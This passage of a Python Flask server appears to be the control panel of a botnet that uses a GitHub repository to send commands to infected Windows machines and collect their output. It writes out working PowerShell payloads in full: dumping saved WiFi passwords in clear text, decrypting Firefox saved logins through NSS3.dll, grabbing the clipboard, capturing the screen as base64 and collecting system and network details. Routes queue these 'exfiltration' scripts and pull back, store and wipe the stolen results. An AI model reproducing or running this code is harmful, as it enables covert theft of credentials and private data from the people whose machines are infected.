            "message": f"Add screenshot command for bot {bot_uuid}",
            "content": encoded_content,
            "sha": current_sha
        }
        
        update_response = requests.put(commands_url, headers=headers, json=update_data)
        
        if update_response.status_code not in [200, 201]:
            print(f"Failed to update commands file: {update_response.status_code} - {update_response.text}")
            return jsonify({"status": "error", "message": "Failed to write screenshot command to GitHub"}), 500
        
        print(f"Screenshot command sent to bot {bot_uuid}")
        
        return jsonify({
            "status": "success",
            "message": "Screenshot command sent successfully",
            "bot_uuid": bot_uuid,
            "command": "screenshot"
        })
        
    except Exception as e:
        print(f"Error in take_screenshot: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/exfil-bots", methods=["GET"])
def get_exfil_bots():
    """Get all bots for exfiltration operations"""
    try:
        username = request.args.get("username", "admin")
        print(f"Getting bots for exfiltration for username: {username}")
        
        # Get bots from MongoDB
        bots = db["bots"]
        user_bots = list(bots.find({"username": username}))
        
        # Clean ObjectId fields
        cleaned_bots = []
        for bot in user_bots:
            bot["_id"] = str(bot["_id"])
            cleaned_bots.append(bot)
        
        print(f"Found {len(cleaned_bots)} bots for exfiltration for user {username}")
        
        return jsonify({
            "status": "success",
            "message": f"Retrieved {len(cleaned_bots)} bots successfully for exfiltration",
            "bots": cleaned_bots
        })
        
    except Exception as e:
        print(f"Error in get_exfil_bots: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/start-exfil", methods=["POST"])
def start_exfil():
    """Start comprehensive exfiltration operation on a bot - executes all scripts"""
    try:
        data = request.get_json()
        print(f"Starting comprehensive exfil with data: {data}")
        
        if not data:
            return jsonify({"status": "error", "message": "No data provided"}), 400
        
        bot_uuid = data.get("bot_uuid")
        username = data.get("username", "admin")
        
        if not bot_uuid:
            return jsonify({"status": "error", "message": "Bot UUID is required"}), 400
        
        # Get bot information from MongoDB
        bots = db["bots"]
        bot = bots.find_one({"uuid": bot_uuid, "username": username})
        
        if not bot:
            return jsonify({"status": "error", "message": "Bot not found"}), 404
        
        # Get GitHub configuration
        user_config = configs.find_one({"username": username})
        if not user_config:
            return jsonify({"status": "error", "message": "User configuration not found"}), 404
        
        github_pat = user_config.get("github_pat")
        github_username = user_config.get("github_username")
        github_repo = user_config.get("github_repo")
        
        if not all([github_pat, github_username, github_repo]):
            return jsonify({"status": "error", "message": "GitHub configuration incomplete"}), 400
        
        # Create GitHub API headers
        headers = {
            "Authorization": f"token {github_pat}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        # Define all PowerShell commands to execute
        all_commands = [
            {
                "name": "WiFi Passwords",
                "command": "(netsh wlan show profiles) | Select-String \"All User Profile\" | ForEach-Object { $n = $_.ToString().Split(\":\")[1].Trim(); $pw = (netsh wlan show profile name=\"$n\" key=clear) | Select-String \"Key Content\" | ForEach-Object { $_.ToString().Split(\":\")[1].Trim() }; \"$n : $($pw -join ',')\" }"
            },
            {
                "name": "Firefox Passwords", 
                "command": '''Clear-Host; Write-Host ""; Write-Host "╔════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan; Write-Host "║         Firefox Password Decrypt - Enhanced Version               ║" -ForegroundColor Cyan; Write-Host "╚════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan; Write-Host ""; function Find-FirefoxFiles { Write-Host "[*] Searching for Firefox profiles..." -ForegroundColor Yellow; $profilesDir = Join-Path -Path $env:APPDATA -ChildPath 'Mozilla\\Firefox\\Profiles\\'; if (-not (Test-Path $profilesDir)) { Write-Host "[!] Firefox profiles directory not found: $profilesDir" -ForegroundColor Red; return $null }; $profiles = Get-ChildItem -Path $profilesDir | Where-Object { $_.PSIsContainer }; Write-Host "[+] Found $($profiles.Count) Firefox profile(s)" -ForegroundColor Green; $core = $null; foreach ($profile in $profiles) { $loginsPath = Join-Path -Path $profile.FullName -ChildPath 'logins.json'; if (Test-Path $loginsPath) { $core = $profile.FullName; Write-Host "[+] Using profile: $($profile.Name)" -ForegroundColor Green; break } }; if (-not $core) { $core = Join-Path -Path $profilesDir -ChildPath (($profiles | Select-Object -First 1).Name); Write-Host "[!] No logins.json found, using first profile" -ForegroundColor Yellow }; $locations = @{ 'profile' = $core; 'places' = (Join-Path -Path $core -ChildPath 'places.sqlite'); 'cookies' = (Join-Path -Path $core -ChildPath 'cookies.sqlite'); 'forms' = (Join-Path -Path $core -ChildPath 'formhistory.sqlite'); 'passwords' = (Join-Path -Path $core -ChildPath 'logins.json') }; $verifiedLocations = @{}; foreach($loc in $locations.GetEnumerator()) { if(Test-Path $loc.Value) { $verifiedLocations.add($loc.Name, $loc.Value); Write-Host "    [✓] Found: $($loc.Name)" -ForegroundColor Gray } }; return $verifiedLocations }; function ConvertFrom-NSS { param([Parameter(Position = 0, Mandatory = $true)][String[]] $Data, [Parameter(Position = 1, Mandatory = $true)][String] $ProfileDir); Write-Host "[*] Searching for NSS3.dll..." -ForegroundColor Yellow; $locations = @( Join-Path $env:ProgramFiles 'Mozilla Firefox'; Join-Path ${env:ProgramFiles(x86)} 'Mozilla Firefox'; Join-Path $env:ProgramFiles 'Nightly'; Join-Path ${env:ProgramFiles(x86)} 'Nightly' ); [String] $NSSDll = ''; foreach($loc in $locations) { $nssPath = Join-Path $loc 'nss3.dll'; if(Test-Path $nssPath) { $NSSDll = $nssPath; Write-Host "[+] Found NSS3.dll at: $NSSDll" -ForegroundColor Green; break } }; if($NSSDll -eq '') { Write-Host "[!] NSS3.dll not found! Firefox may not be installed." -ForegroundColor Red; return $NULL }; Write-Host "[*] Initializing NSS library..." -ForegroundColor Yellow; $DynAssembly = New-Object System.Reflection.AssemblyName('NSSLib'); $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run); $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('NSSLib', $False); $TypeBuilder = $ModuleBuilder.DefineType('NSS', 'Public, Class'); $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String])); $FieldArray = [Reflection.FieldInfo[]] @( [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'), [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'), [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'), [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'), [Runtime.InteropServices.DllImportAttribute].GetField('CharSet') ); $PInvokeMethodInit = $TypeBuilder.DefineMethod( 'NSS_Init', [Reflection.MethodAttributes] 'Public, Static', [Int], [Type[]] @([String])); $FieldValueArrayInit = [Object[]] @( 'NSS_Init', $True, $True, [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::ANSI ); $SetLastErrorCustomAttributeInit = New-Object Reflection.Emit.CustomAttributeBuilder( $DllImportConstructor, @($NSSDll), $FieldArray, $FieldValueArrayInit); $PInvokeMethodInit.SetCustomAttribute($SetLastErrorCustomAttributeInit); $StructAttributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'; $StructBuilder = $ModuleBuilder.DefineType('SecItem', $StructAttributes, [System.ValueType]); $StructBuilder.DefineField('type', [int], 'Public') | Out-Null; $StructBuilder.DefineField('data', [IntPtr], 'Public') | Out-Null; $StructBuilder.DefineField('len', [int], 'Public') | Out-Null; $SecItemType = $StructBuilder.CreateType(); $PInvokeMethodDecrypt = $TypeBuilder.DefineMethod( 'PK11SDR_Decrypt', [Reflection.MethodAttributes] 'Public, Static', [Int], [Type[]] @($SecItemType, $SecItemType.MakeByRefType())); $FieldValueArrayDecrypt = [Object[]] @( 'PK11SDR_Decrypt', $True, $True, [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Unicode ); $SetLastErrorCustomAttributeDecrypt = New-Object Reflection.Emit.CustomAttributeBuilder( $DllImportConstructor, @($NSSDll), $FieldArray, $FieldValueArrayDecrypt); $PInvokeMethodDecrypt.SetCustomAttribute($SetLastErrorCustomAttributeDecrypt); $NSS = $TypeBuilder.CreateType(); $NSS::NSS_Init($ProfileDir) | Out-Null; Write-Host "[+] NSS library initialized successfully" -ForegroundColor Green; Write-Host "[*] Decrypting passwords..." -ForegroundColor Yellow; $decryptedArray = New-Object System.Collections.ArrayList; foreach($dataPart in $Data) { $dataBytes = [System.Convert]::FromBase64String($dataPart); $dataPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dataBytes.Length); [System.Runtime.InteropServices.Marshal]::Copy($dataBytes, 0, $dataPtr, $dataBytes.Length); $encrypted = [Activator]::CreateInstance($SecItemType); $encrypted.type = 0; $encrypted.data = $dataPtr; $encrypted.len = $dataBytes.Length; $decrypted = [Activator]::CreateInstance($SecItemType); $decrypted.type = 0; $decrypted.data = [IntPtr]::Zero; $decrypted.len = 0; $NSS::PK11SDR_Decrypt($encrypted, [ref] $decrypted) | Out-Null; $bytePtr = $decrypted.data; $byteData = [byte[]]::new($decrypted.len); [System.Runtime.InteropServices.Marshal]::Copy($bytePtr, $byteData, 0, $decrypted.len); $dataStr = [System.Text.Encoding]::UTF8.GetString($byteData); $decryptedArray.Add($dataStr) | Out-Null; [System.Runtime.InteropServices.Marshal]::FreeHGlobal($dataPtr) }; Write-Host "[+] Decryption completed successfully" -ForegroundColor Green; return $decryptedArray.ToArray() }; function Get-FirefoxPasswords { try { $firefoxFiles = Find-FirefoxFiles; if (-not $firefoxFiles) { Write-Host "[!] No Firefox files found" -ForegroundColor Red; return $null }; if (-not $firefoxFiles['passwords']) { Write-Host "[!] No Firefox passwords file found" -ForegroundColor Red; return $null }; Write-Host "[*] Reading passwords file..." -ForegroundColor Yellow; $passwordData = ((Get-Content -Path $firefoxFiles['passwords']) | ConvertFrom-Json).logins; $profileDir = $firefoxFiles['profile']; if (-not $passwordData) { Write-Host "[!] No saved passwords found in Firefox" -ForegroundColor Yellow; return $null }; Write-Host "[+] Found $($passwordData.Length) saved password(s)" -ForegroundColor Green; $length = $passwordData.Length; $revised = @(0) * $length; $decrypt = @(0) * ($length * 2); for($i = 0; $i -lt $length; $i++) { $decrypt[($i * 2)] = $passwordData[$i].encryptedUsername; $decrypt[($i * 2) + 1] = $passwordData[$i].encryptedPassword }; $decrypted = ConvertFrom-NSS -Data $decrypt -ProfileDir $profileDir; if (-not $decrypted) { Write-Host "[!] Failed to decrypt passwords" -ForegroundColor Red; return $null }; for($i = 0; $i -lt $length; $i++) { $revisedPart = $passwordData[$i] | Select-Object * -ExcludeProperty @('httpRealm', 'encryptedUsername', 'encryptedPassword'); $revisedPart | Add-Member -MemberType 'NoteProperty' -Name 'username' -Value $decrypted[($i * 2)]; $revisedPart | Add-Member -MemberType 'NoteProperty' -Name 'password' -Value $decrypted[($i * 2) + 1]; $revised[$i] = $revisedPart }; return $revised } catch { Write-Host "[!] Error in Get-FirefoxPasswords: $($_.Exception.Message)" -ForegroundColor Red; return $null } }; try { Write-Host ""; $DecryptedPasswords = Get-FirefoxPasswords; if ($DecryptedPasswords) { Write-Host ""; Write-Host "╔════════════════════════════════════════════════════════════════════╗" -ForegroundColor Green; Write-Host "║                    DECRYPTED PASSWORDS                             ║" -ForegroundColor Green; Write-Host "╚════════════════════════════════════════════════════════════════════╝" -ForegroundColor Green; Write-Host ""; $Count = 0; foreach ($Password in $DecryptedPasswords) { $Count++; $timeCreated = if ($Password.timeCreated) { [DateTimeOffset]::FromUnixTimeMilliseconds($Password.timeCreated).LocalDateTime.ToString("yyyy-MM-dd HH:mm:ss") } else { "N/A" }; $timeLastUsed = if ($Password.timeLastUsed) { [DateTimeOffset]::FromUnixTimeMilliseconds($Password.timeLastUsed).LocalDateTime.ToString("yyyy-MM-dd HH:mm:ss") } else { "N/A" }; Write-Host "┌─────────────────────────────────────────────────────────────────────┐" -ForegroundColor Cyan; Write-Host "│ PASSWORD ENTRY #$Count" -ForegroundColor Yellow; Write-Host "├─────────────────────────────────────────────────────────────────────┤" -ForegroundColor Cyan; Write-Host "│ " -NoNewline -ForegroundColor Cyan; Write-Host "Website:       " -NoNewline -ForegroundColor White; Write-Host "$($Password.hostname)" -ForegroundColor Cyan; Write-Host "│ " -NoNewline -ForegroundColor Cyan; Write-Host "Username:      " -NoNewline -ForegroundColor White; Write-Host "$($Password.username)" -ForegroundColor Yellow; Write-Host "│ " -NoNewline -ForegroundColor Cyan; Write-Host "Password:      " -NoNewline -ForegroundColor White; Write-Host "$($Password.password)" -ForegroundColor Red; if ($Password.formActionURL) { Write-Host "│ " -NoNewline -ForegroundColor Cyan; Write-Host "Form Action:   " -NoNewline -ForegroundColor White; Write-Host "$($Password.formActionURL)" -ForegroundColor Gray }; Write-Host "│ " -NoNewline -ForegroundColor Cyan; Write-Host "Created:       " -NoNewline -ForegroundColor White; Write-Host "$timeCreated" -ForegroundColor Gray; Write-Host "│ " -NoNewline -ForegroundColor Cyan; Write-Host "Last Used:     " -NoNewline -ForegroundColor White; Write-Host "$timeLastUsed" -ForegroundColor Gray; Write-Host "└─────────────────────────────────────────────────────────────────────┘" -ForegroundColor Cyan; Write-Host "" }; Write-Host "╔════════════════════════════════════════════════════════════════════╗" -ForegroundColor Green; Write-Host "║ " -NoNewline -ForegroundColor Green; Write-Host "Total passwords successfully decrypted: $Count" -NoNewline -ForegroundColor White; $padding = 69 - 41 - $Count.ToString().Length; Write-Host (" " * $padding) -NoNewline; Write-Host "║" -ForegroundColor Green; Write-Host "╚════════════════════════════════════════════════════════════════════╝" -ForegroundColor Green; Write-Host "" } else { Write-Host ""; Write-Host "╔════════════════════════════════════════════════════════════════════╗" -ForegroundColor Red; Write-Host "║                         NO RESULTS                                 ║" -ForegroundColor Red; Write-Host "╚════════════════════════════════════════════════════════════════════╝" -ForegroundColor Red; Write-Host ""; Write-Host "[!] No passwords found or decryption failed" -ForegroundColor Yellow; Write-Host "[!] Possible reasons:" -ForegroundColor Yellow; Write-Host "    - Firefox is not installed" -ForegroundColor Gray; Write-Host "    - No passwords saved in Firefox" -ForegroundColor Gray; Write-Host "    - Firefox is currently running (close it and try again)" -ForegroundColor Gray; Write-Host "    - Insufficient permissions" -ForegroundColor Gray; Write-Host "" } } catch { Write-Host ""; Write-Host "╔════════════════════════════════════════════════════════════════════╗" -ForegroundColor Red; Write-Host "║                           ERROR                                    ║" -ForegroundColor Red; Write-Host "╚════════════════════════════════════════════════════════════════════╝" -ForegroundColor Red; Write-Host ""; Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red; Write-Host "[!] Stack Trace:" -ForegroundColor Yellow; Write-Host $_.ScriptStackTrace -ForegroundColor Gray; Write-Host ""; Write-Host "[i] Troubleshooting tips:" -ForegroundColor Cyan; Write-Host "    1. Close Firefox completely" -ForegroundColor Gray; Write-Host "    2. Run PowerShell as Administrator" -ForegroundColor Gray; Write-Host "    3. Check if Firefox is installed in a standard location" -ForegroundColor Gray; Write-Host "" }; Write-Host "╔════════════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan; Write-Host "║                    SCRIPT COMPLETED                                ║" -ForegroundColor Cyan; Write-Host "╚════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan; Write-Host ""'''
            },
            {
                "name": "Clipboard Content",
                "command": "Get-Clipboard"
            },
            {
                "name": "Camera Screenshot", 
                "command": '''Add-Type -AssemblyName System.Drawing; Add-Type -AssemblyName System.Windows.Forms; $b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bm=New-Object System.Drawing.Bitmap $b.Width,$b.Height; $g=[System.Drawing.Graphics]::FromImage($bm); $g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size); $f="$env:TEMP\\camera_screenshot.jpg"; $bm.Save($f,[System.Drawing.Imaging.ImageFormat]::Jpeg); $bm.Dispose(); $g.Dispose(); Start-Process "microsoft.windows.camera:"; Start-Sleep 5; Get-Process | Where-Object { $_.Name -like "*WindowsCamera*" } | ForEach-Object { try { Stop-Process -Id $_.Id -Force } catch {} }; [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($f)) | Write-Output'''
            },
            {
                "name": "System Information",
                "command": '''Write-Host "===== SYSTEM INFO ====="; ([PSCustomObject]@{Host=$env:COMPUTERNAME;User=$env:USERNAME;OS=(Get-CimInstance Win32_OperatingSystem).Caption;Version=(Get-CimInstance Win32_OperatingSystem).Version}) | Format-Table -AutoSize; Write-Host "===== INSTALLED SOFTWARE ====="; Get-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* -ErrorAction SilentlyContinue | Select-Object DisplayName, DisplayVersion | Format-Table -AutoSize; Write-Host "===== PROCESSES ====="; Get-Process | Select Name, Id | Format-Table -AutoSize; Write-Host "===== SERVICES ====="; Get-Service | Select Name, Status | Format-Table -AutoSize; Write-Host "===== NETWORK ====="; Get-NetAdapter | Where Status -eq 'Up' | Select Name, MacAddress | Format-Table -AutoSize; Get-NetIPAddress | Where AddressFamily -eq 'IPv4' | Select IPAddress, InterfaceAlias | Format-Table -AutoSize; Write-Host "===== WIFI PROFILES ====="; (netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object {($_.ToString().Split(':')[1]).Trim()}) | Format-Table @{Expression={$_};Label="ProfileName"} -AutoSize; Write-Host "===== PUBLIC IP ====="; try { (Invoke-RestMethod 'https://api.ipify.org?format=json').ip } catch { 'Unable to retrieve' }'''
            }
        ]
        
        # Create a simple PowerShell script that executes basic commands
        comprehensive_script = '''Write-Host "=== EXFILTRATION STARTED ===" -ForegroundColor Green

Write-Host "=== WIFI PASSWORDS ===" -ForegroundColor Yellow
(netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object { $n = $_.ToString().Split(":")[1].Trim(); $pw = (netsh wlan show profile name="$n" key=clear) | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }; "$n : $($pw -join ',')" }

Write-Host "=== CLIPBOARD ===" -ForegroundColor Yellow  
Get-Clipboard

Write-Host "=== SYSTEM INFO ===" -ForegroundColor Yellow
Write-Host "Computer: $env:COMPUTERNAME"
Write-Host "User: $env:USERNAME"
Write-Host "OS: $((Get-CimInstance Win32_OperatingSystem).Caption)"
Get-Process | Select Name, Id | Format-Table -AutoSize

Write-Host "=== SCREENSHOT ===" -ForegroundColor Yellow
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Forms
$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bm=New-Object System.Drawing.Bitmap $b.Width,$b.Height
$g=[System.Drawing.Graphics]::FromImage($bm)
$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size)
$f="$env:TEMP\\screenshot.jpg"
$bm.Save($f,[System.Drawing.Imaging.ImageFormat]::Jpeg)
$bm.Dispose()
$g.Dispose()
[Convert]::ToBase64String([System.IO.File]::ReadAllBytes($f))

Write-Host "=== EXFILTRATION COMPLETED ===" -ForegroundColor Green'''
        
        # Get current commands file content
        commands_url = f"https://api.github.com/repos/{github_username}/{github_repo}/contents/commands/{bot_uuid}.txt"
        commands_response = requests.get(commands_url, headers=headers)
        
        if commands_response.status_code != 200:
            return jsonify({"status": "error", "message": "Failed to access commands file"}), 500
        
        current_content = commands_response.json()
        current_sha = current_content["sha"]
        
        # Prepare new content with the comprehensive script
        new_content = f"{comprehensive_script}\n"
        encoded_content = base64.b64encode(new_content.encode()).decode()
        
        # Update commands file
        update_data = {
            "message": f"Add comprehensive exfil script for bot {bot_uuid}",
            "content": encoded_content,
            "sha": current_sha
        }
        
        update_response = requests.put(commands_url, headers=headers, json=update_data)
        
        if update_response.status_code not in [200, 201]:
            print(f"Failed to update commands file: {update_response.status_code} - {update_response.text}")
            return jsonify({"status": "error", "message": "Failed to write exfil command to GitHub"}), 500
        
        # Create comprehensive exfil operation record in MongoDB
        exfil_operation = {
            "id": str(uuid.uuid4()),
            "bot_uuid": bot_uuid,
            "username": username,
            "exfil_type": "comprehensive",
            "status": "in_progress",
            "created_at": datetime.datetime.now().isoformat(),
            "data": None,
            "is_base64": False,
            "scripts_executed": [cmd["name"] for cmd in all_commands]
        }
        
        # Create exfil_operations collection if it doesn't exist
        exfil_ops = db["exfil_operations"]
        exfil_result = exfil_ops.insert_one(exfil_operation)
        
        print(f"Comprehensive exfil operation started for bot {bot_uuid}")
        
        return jsonify({
            "status": "success",
            "message": f"Comprehensive exfiltration operation started successfully",
            "bot_uuid": bot_uuid,
            "exfil_type": "comprehensive",
            "operation_id": exfil_operation["id"],
            "scripts_executed": [cmd["name"] for cmd in all_commands]
        })
        
    except Exception as e:
        print(f"Error in start_exfil: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/get-exfil-results", methods=["GET"])
def get_exfil_results():
    """Get exfiltration results from a specific bot's results file"""
    try:
        bot_uuid = request.args.get("bot_uuid")
        username = request.args.get("username", "admin")
        
        if not bot_uuid:
            return jsonify({"status": "error", "message": "Bot UUID is required"}), 400
        
        # Get bot information from MongoDB
        bots = db["bots"]
        bot = bots.find_one({"uuid": bot_uuid, "username": username})
        
        if not bot:
            return jsonify({"status": "error", "message": "Bot not found"}), 404
        
        # Get GitHub configuration
        user_config = configs.find_one({"username": username})
        if not user_config:
            return jsonify({"status": "error", "message": "User configuration not found"}), 404
        
        github_pat = user_config.get("github_pat")
        github_username = user_config.get("github_username")
        github_repo = user_config.get("github_repo")
        
        if not all([github_pat, github_username, github_repo]):
            return jsonify({"status": "error", "message": "GitHub configuration incomplete"}), 400
        
        # Create GitHub API headers
        headers = {
            "Authorization": f"token {github_pat}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        # Get results file content
        results_url = f"https://api.github.com/repos/{github_username}/{github_repo}/contents/results/{bot_uuid}.txt"
        results_response = requests.get(results_url, headers=headers)
        
        if results_response.status_code != 200:
            return jsonify({"status": "error", "message": "Failed to access results file"}), 500
        
        results_content = results_response.json()
        results_data = base64.b64decode(results_content["content"]).decode()
        
        # Check if there are actual results (not just the initial content or cleared content)
        if (results_data.strip() and 
            not results_data.startswith("# Results for bot") and 
            not results_data.startswith("# Results cleared")):
            
            # Store the results in MongoDB exfil_operations collection
            exfil_ops = db["exfil_operations"]
            
            # Find the most recent in_progress operation for this bot
            operation = exfil_ops.find_one({
                "bot_uuid": bot_uuid,
                "username": username,
                "status": "in_progress"
            }, sort=[("created_at", -1)])
            
            if operation:
                # Update the operation with results
                exfil_ops.update_one(
                    {"_id": operation["_id"]},
                    {
                        "$set": {
                            "status": "completed",
                            "data": results_data,
                            "completed_at": datetime.datetime.now().isoformat()
                        }
                    }
                )
            
            # Clear the results file immediately after reading
            clear_data = {
                "message": f"Clear results for bot {bot_uuid}",
                "content": base64.b64encode("# Results cleared\n".encode()).decode(),
                "sha": results_content["sha"]
            }
            
            clear_response = requests.put(results_url, headers=headers, json=clear_data)
            if clear_response.status_code not in [200, 201]:
                print(f"Warning: Failed to clear results file: {clear_response.status_code}")
            
            return jsonify({
                "status": "success",
                "message": "Exfil results retrieved successfully",
                "results": results_data,
                "bot_uuid": bot_uuid,
                "is_base64": operation.get("is_base64", False) if operation else False
            })
        else:
            return jsonify({
                "status": "success",
                "message": "No new exfil results available",
                "results": None,
                "bot_uuid": bot_uuid
            })
        
    except Exception as e:
        print(f"Error in get_exfil_results: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/exfil-operations", methods=["GET"])
def get_exfil_operations():
    """Get all exfiltration operations for a user"""
    try:
        username = request.args.get("username", "admin")
        print(f"Getting exfil operations for username: {username}")
        
        # Get exfil operations from MongoDB
        exfil_ops = db["exfil_operations"]
        user_operations = list(exfil_ops.find({"username": username}))
        
        # Clean ObjectId fields
        cleaned_operations = []
        for operation in user_operations:
            operation["_id"] = str(operation["_id"])
            cleaned_operations.append(operation)
        
        print(f"Found {len(cleaned_operations)} exfil operations for user {username}")
        
        return jsonify({
            "status": "success",
            "message": f"Retrieved {len(cleaned_operations)} exfil operations successfully",
            "operations": cleaned_operations
        })
        
    except Exception as e:
        print(f"Error in get_exfil_operations: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)
